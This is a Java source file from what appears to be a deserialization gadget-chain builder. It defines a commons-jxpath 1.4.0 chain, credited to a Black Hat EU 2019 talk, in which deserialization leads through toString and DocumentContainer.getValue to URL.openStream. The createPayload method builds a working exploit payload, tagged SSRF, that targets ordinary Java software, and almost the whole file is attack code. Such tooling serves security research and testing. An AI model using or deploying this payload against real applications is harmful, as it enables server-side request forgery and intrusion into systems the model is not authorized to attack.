package org.ses.gadgetbuilder.chains1;

import org.apache.commons.jxpath.BasicVariables;
import org.apache.commons.jxpath.Container;
import org.apache.commons.jxpath.ri.QName;
import org.apache.commons.jxpath.ri.model.VariablePointer;
import org.apache.commons.jxpath.xml.DocumentContainer;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.ToStringTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.net.URL;


/**
 * From https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf
 *
 * but uses VariablePointer instead of ContainerPointer because ContainerPointer has its own asPath implementation
 *
 * org/apache/commons/jxpath/ri/model/NodePointer.toString()Ljava/lang/String; (0)
 * 2. org/apache/commons/jxpath/ri/model/ValuePointer.asPath()Ljava/lang/String; (0)
 * 3. org/apache/commons/jxpath/ri/model/container/ValuePointer.isCollection()Z (0)
 * 4. org/apache/commons/jxpath/util/ValueUtils.isCollection(Ljava/lang/Object;)Z (0)
 * 5. org/apache/commons/jxpath/util/ValueUtils.getValue(Ljava/lang/Object;)Ljava/lang/Object; (0)
 * 6. org/apache/commons/jxpath/xml/DocumentContainer.getValue()Ljava/lang/Object; (0)
 * 7. java/net/URL.openStream()Ljava/io/InputStream; (0)
 */

@Dependencies({"commons-jxpath:1.4.0"})
@Authors({Authors.YONGTAO, Authors.LZHANG, Authors.KCHAI})
@Impact(Impact.SSRF)
public class JXPath extends GadgetChain<ToStringTrampoline> {


    public JXPath(ToStringTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        Container documentContainerObj = new DocumentContainer(new URL(command));

        BasicVariables variables = new BasicVariables();
        variables.declareVariable("foo", documentContainerObj);
        VariablePointer pointer = new VariablePointer(variables, new QName("foo"));
        Reflections.setFieldValue(pointer, "index", 0);

        return new TrampolineConnector(pointer);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "org.apache.commons.jxpath.ri.model.NodePointer.toString()\n" +
                "org.apache.commons.jxpath.ri.model.ValuePointer.asPath()\n" +
                "org.apache.commons.jxpath.ri.model.container.ValuePointer.isCollection()\n" +
                "org.apache.commons.jxpath.util.ValueUtils.isCollection(java.lang.Object)\n" +
                "org.apache.commons.jxpath.util.ValueUtils.getValue(java.lang.Object)\n" +
                "org.apache.commons.jxpath.xml.DocumentContainer.getValue()\n" +
                "java.net.URL.openStream()";
    }
}
